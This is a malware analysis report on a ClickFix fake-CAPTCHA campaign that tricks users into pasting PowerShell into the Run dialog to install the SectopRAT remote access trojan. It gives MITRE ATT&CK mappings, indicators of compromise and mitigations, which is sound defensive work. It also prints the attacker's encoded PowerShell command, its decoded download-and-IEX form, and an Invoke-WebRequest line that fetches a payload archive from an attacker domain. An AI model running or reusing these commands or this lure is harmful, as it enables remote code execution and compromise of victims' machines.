# 🔍 Threat Analysis Report: ClickFix Technique (RAT Distribution) - SectopRAT

**Author:** Hernan Diaz Veas
**Incident/Analysis Date:** June 2025
**Category:** Malware Analysis / Threat Intelligence

---

## 📝 Executive Summary
This report details the infection chain of a Remote Access Trojan (RAT) distribution (SectopRAT) campaign using a social engineering technique known as **ClickFix**. The threat initiates its attack vector by compromising legitimate websites to redirect victims to pages simulating fake CAPTCHA validations. Through visual deception, the user is prompted to copy and execute malicious commands directly into their system's terminal, facilitating the execution of fileless payloads via PowerShell.

## 🔬 Technical Analysis

### 1. Initial Infection Vector
The compromise chain begins with an email containing a legitimate URL. However, the underlying website has been compromised. Upon accessing the URL, traffic is redirected to attacker-controlled infrastructure:
* **Redirection URL:** `hxxp://cta[.]berlmember[.]com/google/captcha[.]html`

This page presents a fake CAPTCHA challenge ("Robot or human?"). The on-screen instructions use pure social engineering to guide the user to:
1. Press `Windows + R` (open the Run dialog).
2. Press `CTRL + V` (paste the malicious content loaded into the clipboard by the webpage).
3. Press `Enter` (execute).

### 2. Execution Chain
By performing the actions indicated by the fake CAPTCHA, the user executes the following obfuscated PowerShell command:

`powershell -win 1 -ep bypass noni -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMQA2AC4AMgAzADgALgA5ADAALgAxADQANQAvAHcALwBrAG8AYQAnACkAIAB8ACAASQBFAFgA`

**Payload Decoding:**
The `-enc` parameter indicates Base64 encoding. Decoding the string reveals the script's true behavior:

`(New-Object Net.WebClient).DownloadString('http://216[.]238[.]90[.]145/w/koa') | IEX`

This script contacts an external IP, downloads the secondary payload (`koa`) directly into memory, and executes it using `IEX` (Invoke-Expression). Being a fileless technique, it drastically hinders detection by traditional disk-signature-based antivirus engines.

**Downloading Additional Components:**
The execution continues by making an HTTP request to obtain a compressed file:

`Invoke-WebRequest -Uri "https://connect-to-cdn.info/safety/room" -OutFile "$env:TEMP\Lambda.zip"`

Once hosted in the temporary directory, the script decompresses the file and executes the final malicious application: `AppCheckS.exe`.

### 3. Behavioral Analysis
Dynamic analysis of the sample yields a 100% confidence level of malicious activity. Key behavioral indicators include:
* **Evasion Techniques:** Intensive use of PowerShell for operational camouflage and implementation of `sleeps` to evade analysis in automated sandboxing environments.
* **Policy Alteration:** Early modification of PowerShell execution policies to an insecure level (`unrestricted`), ensuring its commands are not blocked.
* **Process Generation:** `powershell.exe` spawns child processes such as `conhost.exe` and `notepad.exe` (the latter opens the script's own code as a possible distraction tactic for the user).

---

## 🎯 MITRE ATT&CK Mapping
The threat has been profiled using the MITRE ATT&CK framework to identify Tactics, Techniques, and Procedures (TTPs):

| Tactic | Technique / Procedure | ID |
| :--- | :--- | :--- |
| **Execution** | Command and Scripting Interpreter: PowerShell | T1059.001 |
| **Persistence** | Hijack Execution Flow: DLL Side-Loading | T1574.002 |
| **Privilege Escalation** | Hijack Execution Flow: DLL Side-Loading<br>Process Injection | T1574.002<br>T1055 |
| **Defense Evasion** | Hijack Execution Flow: DLL Side-Loading<br>Process Injection<br>Virtualization/Sandbox Evasion | T1574.002<br>T1055<br>T1497.001 |
| **Discovery** | Security Software Discovery<br>Process Discovery<br>Virtualization/Sandbox Evasion<br>Application Window Discovery<br>File and Directory Discovery<br>System Information Discovery | T1518.001<br>T1057<br>T1497.001<br>T1010<br>T1083<br>T1082 |
| **Command and Control** | Non-Application Layer Protocol<br>Application Layer Protocol: Web Protocols | T1095<br>T1071.001 |

---

## 📌 Indicators of Compromise (IOCs)

**URLs and Domains (Defanged):**
* `hxxp://cta[.]berlmember[.]com/google/captcha[.]html` (Initial ClickFix Page)
* `hxxps://connect-to-cdn[.]info/safety/room` (.zip file distribution)

**IP Addresses (Defanged):**
* `216[.]238[.]90[.]145` (In-memory payload hosting server)

**Related Files:**
* `koa` (In-memory payload)
* `Lambda.zip` (Downloaded compressed file)
* `AppCheckS.exe` (Final malicious executable)

**Reference Reports (JoeSandbox):**
* [ClickFix Analysis (1625946)](https://www.joesandbox.com/analysis/1625946)
* ['koa' payload Analysis (1617784)](https://www.joesandbox.com/analysis/1617784)

---

## 🛡️ Detection and Mitigation
* **Endpoint Command Monitoring:** Configure security alerts and EDR telemetry for the execution of `powershell.exe` with suspicious arguments (`-ep bypass`, `-enc`) and prolonged Base64 sequences.
* **Intelligence and Attack Surface:** Integrate the extracted IPs and domains into perimeter blocklists. Validate the passive exposure of this infrastructure by querying malicious IPs through collection platforms like Shodan.
* **Cloud Security Posture:** Ensure that workloads and instances in cloud or container environments have network and runtime defense policies (such as those implemented through Prisma Cloud) that block outbound connections to uncategorized IPs.
* **Restriction Policies:** Reinforce PowerShell execution policies via local or domain GPOs, preventing unauthorized alterations to `unrestricted`.
